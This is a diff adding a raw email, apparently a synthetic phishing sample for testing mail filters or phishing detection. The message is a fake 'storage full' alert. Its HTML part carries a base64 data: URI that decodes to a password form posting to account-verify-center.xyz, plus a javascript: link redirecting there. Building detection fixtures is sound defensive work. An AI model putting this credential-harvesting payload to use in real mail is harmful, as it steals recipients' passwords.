@@ -1,0 +1,22 @@
+Received: from relay.account-verify-center.xyz (relay.account-verify-center.xyz [203.0.113.23]) by mx.example.org (Postfix) with ESMTPS id 212121 for <jordan.lee@example.org>; Mon, 09 Feb 2026 13:48:30 +0000 (UTC)
+Authentication-Results: mx.example.org; spf=pass smtp.mailfrom=bounce@account-verify-center.xyz; dkim=pass header.d=account-verify-center.xyz header.s=d1; dmarc=pass (p=NONE sp=NONE dis=NONE) header.from=account-verify-center.xyz
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=account-verify-center.xyz; s=d1; t=1770644910; bh=MXlensFakeBodyHashSSS=; h=From:To:Subject:Date; b=REFUQV9VUklfMjFfRkFLRV9TSUdOQVRVUkVfVkFMVUVfTk9UX1JF
+From: "Mailbox Admin" <admin@account-verify-center.xyz>
+To: jordan.lee@example.org
+Subject: Storage full - verify to restore
+Date: Mon, 09 Feb 2026 13:48:28 +0000
+Message-ID: <21-du@account-verify-center.xyz>
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="b21alt"
+
+--b21alt
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 7bit
+
+Your mailbox storage is full. Open the inline page to restore access.
+--b21alt
+Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: 7bit
+
+<html><body><p>Your mailbox storage is full.</p><p><a href="data:text/html;base64,PGZvcm0gYWN0aW9uPSJodHRwczovL2FjY291bnQtdmVyaWZ5LWNlbnRlci54eXovZ28iIG1ldGhvZD0iUE9TVCI+PGlucHV0IG5hbWU9InAiIHR5cGU9InBhc3N3b3JkIj48L2Zvcm0+">Restore access</a></p><p><a href="javascript:void(document.location='https://account-verify-center.xyz/go')">Alternate link</a></p></body></html>
+--b21alt--
